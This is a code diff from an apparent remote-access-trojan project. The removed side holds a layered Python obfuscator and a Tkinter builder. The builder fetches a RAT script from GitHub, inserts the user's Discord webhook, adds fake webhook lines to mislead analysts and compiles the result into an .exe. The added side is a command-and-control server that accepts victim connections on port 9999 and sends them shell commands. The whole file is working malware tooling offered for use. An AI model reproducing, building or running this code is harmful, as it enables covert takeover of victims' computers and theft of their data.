@@ -1,483 +1,151 @@
-# Made by Blank-c (github/Blank-c)
-
 import os
-import ast
-import sys
-import zlib
-import base64
-import string
-import random
-import builtins
-import argparse
+import platform
+import socket
+import threading
+if platform.system().startswith("Windows"):
+    try:
+        from pystyle import *
+    except ImportError:
+        os.system("python -m pip install pystyle -q -q -q")
+        from pystyle import *
+elif platform.system().startswith("Linux"):
+    try:
+        from pystyle import *
+    except ImportError:
+        os.system("python3 -m pip install pystyle -q -q -q")
+        from pystyle import *
 
-class BlankOBFv2:
-    def __init__(self, code: str, include_imports: bool=False, recursion: int=1) -> None:
-        self._code = code
-        self._imports = []
-        self._aliases = {}
-        self._valid_identifiers = [chr(x) for x in range(sys.maxunicode) if chr(x).isidentifier()]
+banner = Center.XCenter(r"""
+██████╗ ██╗   ██╗████████╗██╗  ██╗ ██████╗ ███╗   ██╗    ██████╗      █████╗ ████████╗
+██╔══██╗╚██╗ ██╔╝╚══██╔══╝██║  ██║██╔═══██╗████╗  ██║    ██╔══██╗    ██╔══██╗╚══██╔══╝
+██████╔╝ ╚████╔╝    ██║   ███████║██║   ██║██╔██╗ ██║    ██████╔╝    ███████║   ██║   
+██╔═══╝   ╚██╔╝     ██║   ██╔══██║██║   ██║██║╚██╗██║    ██╔══██╗    ██╔══██║   ██║   
+██║        ██║      ██║   ██║  ██║╚██████╔╝██║ ╚████║    ██║  ██║    ██║  ██║   ██║   
+╚═╝        ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝    ╚═╝  ╚═╝    ╚═╝  ╚═╝   ╚═╝   
+                                                                                                            
+""")
+os.system("cls||clear")
+print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
+class Client:
+    def __init__(self, connection, address, client_id):
+        self.connection = connection
+        self.address = address
+        self.client_id = client_id
+        self.data_received = False
 
-        # Options
-        self.__include_imports = include_imports
-        if recursion < 1:
-            raise ValueError("Recursion length cannot be less than 1")
-        else:
-            self.__recursion = recursion
-    
-    def obfuscate(self) -> str:
-        self._remove_comments_and_docstrings()
-        self._save_imports()
+    def handle(self):
+        while True:
+            if self.data_received:
+                try:
+                    data = self.connection.recv(4096)
 
-        # Put layers here
-        layers = [
-            self._layer_1,
-            self._layer_2,
-            self._layer_3
-        ] * self.__recursion
-        random.shuffle(layers)
-
-        # Optimization: The _layer_3 is a bit laggy if it is outermost
-        if layers[-1] == self._layer_3:
-            for index, layer in enumerate(layers):
-                if layer != self._layer_3:
-                    layers[index] = self._layer_3
-                    layers[-1] = layer
-                    break
-        # End of optimization
-
-        for layer in layers:
-            layer()
-
-        if self.__include_imports:
-            self._prepend_imports()
-        return self._code
-    
-    def _save_imports(self) -> None:
-        def visit_node(node):
-            if isinstance(node, ast.Import):
-                for name in node.names:
-                    self._imports.append((None, name.name))
-            elif isinstance(node, ast.ImportFrom):
-                module = node.module
-                for name in node.names:
-                    self._imports.append((module, name.name))
-
-            for child_node in ast.iter_child_nodes(node):
-                visit_node(child_node)
-
-        tree = ast.parse(self._code)
-        visit_node(tree)
-        
-        self._imports = list(set(self._imports))
-        self._imports.sort(reverse=True, key=lambda x: len(x[1]) + len(x[0]) if x[0] is not None else 0)
-    
-    def _prepend_imports(self) -> None:
-        for module, submodule in self._imports:
-            if module is not None:
-                statement = "from %s import %s\n" % (module, submodule)
-            else:
-                statement = "import %s\n" % submodule
-            self._code = statement + self._code
-    
-    def _generate_random_name(self, value: str) -> str:
-        if value in self._aliases.keys():
-            return self._aliases.get(value)
-        else:
-            # Generate new alias
-            while(True):
-                name = "".join(random.choices(self._valid_identifiers, k=random.randint(10, 25)))
-                if not name in self._aliases.values():
-                    self._aliases[value] = name
-                    return name
-                
-    def _remove_comments_and_docstrings(self) -> None:
-        tree = ast.parse(self._code)
-        tree.body.insert(0, ast.Expr(
-                    value=ast.Constant(":: You managed to break through BlankOBF v2; Give yourself a pat on your back! ::")
-                ))
-        for index, node in enumerate(tree.body[1:]):
-            
-            # Module level docstrings
-            if isinstance(node, ast.Expr) and isinstance(node.value, ast.Constant):
-                tree.body[index] = ast.Pass()
-
-            # Function level docstrings
-            elif isinstance(node, ast.FunctionDef) or isinstance(node, ast.AsyncFunctionDef):
-                for index, expr in enumerate(node.body):
-                    if (isinstance(expr, ast.Expr) and isinstance(expr.value, ast.Constant)):
-                        node.body[index] = ast.Pass()
-            
-            elif isinstance(node, ast.ClassDef):
-                for index, expr in enumerate(node.body):
-
-                    # Class level docstrings
-                    if isinstance(expr, ast.Expr) and isinstance(expr.value, ast.Constant):
-                        node.body[index] = ast.Pass()
-
-                    # Class method level docstrings
-                    elif isinstance(expr, ast.FunctionDef) or isinstance(expr, ast.AsyncFunctionDef):
-                        for index, node in enumerate(expr.body):
-                            if isinstance(node, ast.Expr) and isinstance(node.value, ast.Constant):
-                                expr.body[index] = ast.Pass()
-        self._code = ast.unparse(tree)
-                
-    def _insert_dummy_comments(self) -> None:
-        code = self._code.splitlines()
-        for index in range(len(code) - 1, 0, -1):
-            if random.randint(1, 10) > 3:
-                spaces = 0
-                comment = "#"
-                for i in range(random.randint(7, 55)):
-                    comment += " " + "".join(random.choices(self._valid_identifiers, k=random.randint(2, 10)))
-                for i in code[index]:
-                    if i != " ":
+                    if not data:
                         break
-                    else:
-                        spaces += 1
-                code.insert(index, (" " * spaces) + comment)
-        self._code = "\n".join(code)
-    
-    def _obfuscate_vars(self) -> None:
-        # This class is only for modifying small code snippets in this obfuscator
-        class Transformer(ast.NodeTransformer):
-            def __init__(self, outer: BlankOBFv2) -> None:
-                self._outer = outer
 
-            def rename(self, name: str) -> None:
-                if not name in dir(builtins) and not name in [x[1] for x in self._outer._imports]:
-                    return self._outer._generate_random_name(name)
-                else:
-                    return name
-            
-            def visit_Name(self, node: ast.Name) -> ast.Name:
-                if node.id in dir(builtins) or node.id in [x[1] for x in self._outer._imports]:
-                    node = ast.Call(
-                            func=ast.Call(
-                                    func=ast.Name(id="getattr", ctx=ast.Load()),
-                                    args=[
-                                        ast.Call(
-                                            func=ast.Name(id="__import__", ctx=ast.Load()),
-                                            args=[self.visit_Constant(ast.Constant(value="builtins"))],
-                                            keywords=[]
-                                        ),
-                                        self.visit_Constant(ast.Constant(value="eval"))
-                                    ],
-                                    keywords=[]
-                                ),
-                            args=[
-                                ast.Call(
-                                    func=ast.Name(id="bytes", ctx=ast.Load()),
-                                    args=[
-                                        ast.Subscript(
-                                            value = ast.List(
-                                                        elts=[ast.Constant(value=x) for x in list(node.id.encode())][::-1],
-                                                        ctx=ast.Load()
-                                                    ),
-                                            slice=ast.Slice(
-                                                upper=None,
-                                                lower=None,
-                                                step=ast.Constant(value=-1)
-                                            )
-                                        )
-                                    ],
-                                    keywords=[]
-                                )
-                            ],
-                            keywords=[]
-                    )
-                    return node
-                else:
-                    node.id = self.rename(node.id)
-                    return self.generic_visit(node)
-            
-            def visit_FunctionDef(self, node: ast.FunctionDef) -> ast.FunctionDef:
-                node.name = self.rename(node.name)
-                return self.generic_visit(node)
-            
-            def visit_arg(self, node: ast.arg) -> ast.arg:
-                node.arg = self.rename(node.arg)
-                return node
-            
-            def visit_Constant(self, node: ast.Constant) -> ast.Constant:
-                if isinstance(node.value, int):
-                    choice = random.randint(1, 2)
-                    match choice:
-                        case 1: # fn(x) = x*n - x*(n-1) ; Where n > 69^3
-                            num = random.randint(69**3, sys.maxsize)
-                            left = node.value * num
-                            right = node.value * (num - 1)
-                            node = ast.BinOp(left=ast.Constant(value=left), 
-                                            op=ast.Sub(),
-                                            right=ast.Constant(value=right))
-                        
-                        case 2: # fn(x) = ((n*2) + (x*2*m)) // 2 - n - x*(m-1)   ; Where n > 69^3, m ∈ [50, 500]
-                            num = random.randint(69**3, sys.maxsize)
-                            times = random.randint(50, 500)
-                            node = ast.BinOp(
-                                left=ast.BinOp(
-                                    left=ast.BinOp(
-                                        left=ast.BinOp(
-                                            left=ast.Constant(value=num*2),
-                                            op=ast.Add(),
-                                            right=ast.Constant(value=node.value*2*times)
-                                        ),
-                                        op=ast.FloorDiv(),
-                                        right=ast.Constant(value=2)
-                                    ),
-                                    op=ast.Sub(),
-                                    right=ast.Constant(value=num)
-                                ),
-                                op=ast.Sub(),
-                                right=ast.Constant(node.value*(times-1))
-                            )
+                    print(data.decode(), end='')
+                except ConnectionResetError:
+                    break
+                except KeyboardInterrupt:
+                    break
 
-                elif isinstance(node.value, str):
-                    encoded = list(node.value.encode())[::-1]
-                    node = ast.Call(func=ast.Attribute(value=ast.Call(func=ast.Name(id="bytes", ctx=ast.Load()),
-                                                                      args=[ast.Subscript(value=ast.List(elts=[ast.Constant(value=x) for x in encoded],
-                                                                                                        ctx=ast.Load()),
-                                                                                          slice= ast.Slice(lower=None,
-                                                                                                           upper=None,
-                                                                                                           step=ast.Constant(value=-1)), 
-                                                                                          ctx=ast.Load())],
-                                                                      keywords=[]), 
-                                    attr="decode", 
-                                    ctx=ast.Load()), 
-                                    args=[], 
-                                    keywords=[])
-                elif isinstance(node.value, bytes):
-                    encoded = list(node.value)[::-1]
-                    node = ast.Call(func=ast.Name(id="bytes", ctx=ast.Load()),
-                                    args=[ast.Subscript(value=ast.List(elts=[ast.Constant(value=x) for x in encoded],
-                                                                       ctx=ast.Load()),
-                                                        slice= ast.Slice(lower=None,
-                                                                         upper=None,
-                                                                         step=ast.Constant(value=-1)), 
-                                                        ctx=ast.Load())],
-                                    keywords=[])
-                return node
-            
-            def visit_Attribute(self, node: ast.Attribute) -> ast.Attribute:
-                node = ast.Call(
-                    func=ast.Name(id="getattr", ctx=ast.Load()),
-                    args=[node.value, ast.Constant(node.attr)],
-                    keywords=[]
-                )
+        #self.connection.close()
 
-                return self.generic_visit(node)
-        
-        tree = ast.parse(self._code)
-        Transformer(self).visit(tree)
-        self._code = ast.unparse(tree)
-    
-    def _layer_1(self) -> None:
-        layer = """
-fire = ""
-water = ""
-earth = ""
-wind = ""
+class Server:
+    def __init__(self, host, port):
+        self.host = host
+        self.port = port
+        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.server_socket.bind((host, port))
+        self.server_socket.listen(5)
+        self.clients = []
+        self.client_id = 0
 
-exec(__import__("zlib").decompress(__import__("base64").b64decode(fire + water + earth + wind)))
-"""
-        encoded = base64.b64encode(zlib.compress(self._code.encode())).decode()
-        parts = []
-        for index in range(0, len(encoded), int(len(encoded)/4)):
-            parts.append(encoded[index : index + int(len(encoded)/4)])
-        parts.reverse()
+    def total_clients(self):
+        A = len(self.clients)
+        os.system(f"title clients: {A}")
 
-        tree = ast.parse(layer)
-        for node in ast.walk(tree):
-            if isinstance(node, ast.Assign) and isinstance(node.value, ast.Constant) and isinstance(node.value.value, str) and parts:
-                before = "".join(random.choices(string.ascii_letters, k= random.randint(5, 100)))
-                after = "".join(random.choices(string.ascii_letters, k= random.randint(5, 100)))
-                part = parts.pop()
-                node.value = ast.Subscript(
-                    value = ast.Constant(value=before + part + after),
-                    slice=ast.Slice(
-                        upper=ast.Constant(value=len(before) + len(part)),
-                        lower=ast.Constant(value=len(before)),
-                        step=None
-                    ),
-                    ctx=ast.Store()
-                )
-        self._code = ast.unparse(tree)
-        self._obfuscate_vars()
-        self._insert_dummy_comments()
-    
-    def _layer_2(self) -> None:
-        layer = """
-encrypted = []
-for i in range(1, 100):
-    # Replace in_loc with index of input byte 
-    # Replace re_loc with index of output byte
-    if encrypted[in_loc] ^ i == encrypted[re_loc]:
-        exec(__import__("zlib").decompress(bytes(map(lambda x: x^i, encrypted[0:in_loc] + encrypted[in_loc + 1: re_loc] + encrypted[re_loc + 1:]))))
-        break
-"""
-        key = random.randint(1, 100)
-        in_byte = random.randbytes(1)[0]
-        re_byte = in_byte ^ key
+    def start(self):
+        print(f"[+] Listening on {self.host} {self.port}\n")
+        while True:
+            connection, address = self.server_socket.accept()
+            print(Colors.green+f"\n[*] Connection received on {address[0]} {address[1]}\n[*] SERVER COMMAND: ", end='')
+            client = Client(connection, address, self.client_id)
+            self.clients.append(client)
+            self.client_id += 1
+            self.total_clients()
+            client_thread = threading.Thread(target=client.handle)
+            client_thread.start()
 
-        encrypted = list(map(lambda x: key ^ x, zlib.compress(self._code.encode())))
+    def show_clients(self):
+        print(Colors.cyan+"\n[*] Connected clients:")
+        for client in self.clients:
+            A = client.client_id + 1
+            print(f"ID: {client.client_id}, IP: {client.address[0]}, Port: {client.address[1]}")
+            os.system(f"title clients: {A}")
+        print("", end='')
 
-        in_loc = random.randint(0, int(len(encrypted)/2))
-        re_loc = random.randint(in_loc, len(encrypted) - 1)
-        encrypted.insert(in_loc, in_byte)
-        encrypted.insert(re_loc, re_byte)
-        layer = layer.replace("in_loc", str(in_loc)).replace("re_loc", str(re_loc)) # Replace the indices
+    def shell(self, client_id):
+       try:
+           for client in self.clients:
+               if client.client_id == client_id:
+                   print(Colors.yellow + f"[*] Connected to client {client_id}")
+                   client.data_received = True
+                   while True:
+                       command = input("")
+                       if command == "cexit":
+                           os.system("cls||clear")
+                           print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
+                           self.server_commands()
+                       elif command == "clear":
+                           os.system("cls||clear")
+                           print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
+                       client.connection.send(command.encode() + b"\n")
+                       print(f"[*] Sent command: {command}")
+                   break
+           else:
+               print("[-] Client not found\n", end='')
+       except:
+           print(Colors.red + "\n[-] Ctrl+C Detected .......")
+           exit(1)
+    def server_commands(self):
+        try:
+            while True:
+                command = input(Colors.green + "[*] SERVER COMMAND: ")
+                if command.lower() == "exit":
+                    break
+                elif command == "list":
+                    os.system("cls||clear")
+                    print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
+                    self.show_clients()
+                elif command == 'help':
+                    os.system("cls||clear")
+                    print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
+                    print(Colorate.Vertical(Colors.red_to_purple, """
+                                 ****  SERVER COMMANDS MAIN MENU ****
 
-        tree = ast.parse(layer)
-        for node in ast.walk(tree):
-            if isinstance(node, ast.List):
-                node.elts = [ast.Constant(value=x) for x in encrypted]
-        
-        self._code = ast.unparse(tree)
-        self._obfuscate_vars()
-        self._insert_dummy_comments()
+                        1. id 0    | Entering current shell
+                        2. list    | Show Connected Clients
+                        3. back    | Back To The Server Main Menu 
+                                       More Features Will Be Added
+                                       Follow:- github.com/s1uiasdad/python-rat
+                                                    """, 2))
+                elif command == "clear":
+                    os.system("cls||clear")
+                    print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
+                elif command.startswith("id "):
+                    client_id = int(command.split()[1])
+                    self.shell(client_id)
+        except:
+            print(Colors.red+"\n[-] Ctrl+C Detected .......")
+            exit()
 
-    def _layer_3(self) -> None:
-        layer = """
-ip_table = []
-data = list([int(x) for item in [value.split(".") for value in ip_table] for x in item])
-exec(compile(__import__("zlib").decompress(__import__("base64").b64decode(bytes(data))), "<(*3*)>", "exec"))
-"""
-        def bytes2ip(data: bytes) -> list:
-            ip_addresses = []
-            for index in range(0, len(data), 4):
-                ip_bytes = data[index:index+4]
-                ip_addresses.append(".".join([str(x) for x in ip_bytes]))
-            return ip_addresses
-
-        encrypted = base64.b64encode(zlib.compress(self._code.encode()))
-        ip_addresses = bytes2ip(encrypted)
-
-        self._code = layer
-        self._obfuscate_vars()
-        tree = ast.parse(self._code)
-        for node in ast.walk(tree):
-            if isinstance(node, ast.Assign) and isinstance(node.value, ast.List):
-                node.value.elts = [ast.Constant(value=x) for x in ip_addresses]
-        self._code = ast.unparse(tree)
-        self._insert_dummy_comments()
-
-import tkinter as tk
-from tkinter import messagebox
-import requests
-import subprocess
-import os
-import base64
-import marshal
-import bz2
-import random
-import string
-
-def generate_fake_webhooks(writed):
-    junkcode = ""
-    hooksname = (
-        ["real_webhook", "thewebhook", "webh", "fake_webhook", "fake_wbh", "webHOOK"]
-        if writed else
-        ["wbh", "real_webhook", "thewebhook", "webh", "fake_webhook", "fake_wbh", "webHOOK"]
-    )
-    hookstype = [
-        "https://discord.com/api/webhooks/",
-        "https://discordapp.com/api/webhooks/",
-        "https://ptb.discord.com/api/webhooks/",
-        "https://canary.discord.com/api/webhooks/"
-    ]
-    hookslength = [68, 67, 66, 65]
-    lastpart = "-"
-    lstpart = "_"
-
-    for _ in range(125):
-        hook_name = random.choice(hooksname)
-        hook_type = random.choice(hookstype)
-        hook_length = random.choice(hookslength)
-        random_digits = ''.join(random.choice(string.digits) for _ in range(18))
-        random_suffix = ''.join(random.choice(string.ascii_letters + string.digits + lastpart + lstpart) for _ in range(hook_length))
-        
-        hook = f"{hook_name} = '\\n{hook_type}1{random_digits}/{random_suffix}'"
-        junkcode += f"{hook}\n"
-    
-    return junkcode
-
-def is_python_installed():
+if __name__ == "__main__":
     try:
-        subprocess.run(["python", "--version"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        return True
-    except subprocess.CalledProcessError:
-        return False
-
-def download_and_install_python():
-    python_installer_url = "https://www.python.org/ftp/python/3.12.5/python-3.12.5-amd64.exe"
-    installer_path = "python_installer.exe"
-    response = requests.get(python_installer_url, stream=True)
-    with open(installer_path, "wb") as file:
-        file.write(response.content)
-    subprocess.run([installer_path, "/quiet", "InstallAllUsers=1", "PrependPath=1"], check=True)
-
-def install_pyinstaller():
-    subprocess.run(["python", "-m", "pip", "install", "pyinstaller"], check=True)
-
-def obfuscate_code(content):
-    code = BlankOBFv2(code=content, include_imports=False, recursion=1).obfuscate()
-    return generate_fake_webhooks(True) + "import os\n" + code
-
-def obfuscate_and_convert():
-    if not is_python_installed():
-        messagebox.showinfo("Cài đặt Python", "Đang tải và cài đặt Python...")
-        download_and_install_python()
-        # Cài đặt pyinstaller sau khi cài đặt Python
-        install_pyinstaller()
-        messagebox.showinfo("Cài đặt hoàn tất", "Cài đặt Python và pyinstaller đã hoàn tất. Vui lòng khởi động lại ứng dụng.")
-        return
-
-    try:
-        install_pyinstaller()
-    except subprocess.CalledProcessError:
-        messagebox.showerror("Lỗi", "Không thể cài đặt pyinstaller.")
-        return
-
-    webhook = entry.get()
-    if not webhook:
-        messagebox.showerror("Lỗi", "Vui lòng nhập webhook!")
-        return
-
-    url = "https://raw.githubusercontent.com/s1uiasdad/python-rat/main/rat-scr/mainmini.py"
-    response = requests.get(url)
-    if response.status_code != 200:
-        messagebox.showerror("Lỗi", "Không thể tải nội dung từ URL.")
-        return
-
-    script_content = response.text.replace('you_webhook', webhook)
-    obfuscated_code = obfuscate_code(script_content)
-
-    temp_script_path = "mainmini_obfuscated.py"
-    with open(temp_script_path, "w", encoding="utf-8") as file:
-        file.write(obfuscated_code)
-
-    setup_script = f"""
-from PyInstaller.__main__ import run
-
-run([
-    '--name=ObfuscatedApp',
-    '--onefile',
-    '{temp_script_path}'
-])
-    """
-    with open("setup.py", "w") as file:
-        file.write(setup_script)
-
-    subprocess.run(["python", "setup.py"])
-
-    messagebox.showinfo("Hoàn thành", "Quá trình tạo file .exe hoàn tất!")
-
-root = tk.Tk()
-root.title("Webhook Input")
-
-tk.Label(root, text="Nhập webhook:").pack(pady=10)
-entry = tk.Entry(root, width=50)
-entry.pack(pady=5)
-
-tk.Button(root, text="Thực hiện", command=obfuscate_and_convert).pack(pady=20)
-
-root.mainloop()
+        server = Server("0.0.0.0", 9999)
+        server_thread = threading.Thread(target=server.start)
+        server_thread.start()
+        server.server_commands()
+    except KeyboardInterrupt:
+        print(Colors.red+"\n[-] Ctrl+C Detected......")
+        server.stop()
+        exit(1)
